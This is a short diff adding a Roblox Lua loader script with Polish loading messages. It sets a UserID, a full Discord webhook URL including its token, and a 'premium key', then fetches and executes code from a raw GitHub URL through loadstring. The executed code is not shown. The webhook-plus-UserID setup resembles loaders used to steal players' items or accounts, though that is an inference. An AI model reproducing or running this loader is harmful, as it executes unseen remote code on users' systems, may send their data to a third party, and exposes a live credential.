@@ -1,0 +1,9 @@
+_G.UserID = 3815724764
+_G.Webhook = "https://discord.com/api/webhooks/1096139059988021360/cjik2Oc0hUHhBGDeFInIae8zqAqlNXQtOLdD2-q4Kzf8ypMC1i4fdF9ckFoSJOmFXRfj"
+_G.PremiumKey = "45123"
+_G.ScriptName = "WSZYSTKIE SKRYPTY"
+_G.FirstText = "ŁADOWANIE SKRYPTÓW"
+_G.SecondText = "ŁADOWANIE ELEMENTÓW"
+_G.ThirdText = "ŁADOWANIE GUI"
+_G.WaitingTime = 500
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mikoks21/sc/main/ps", true))()
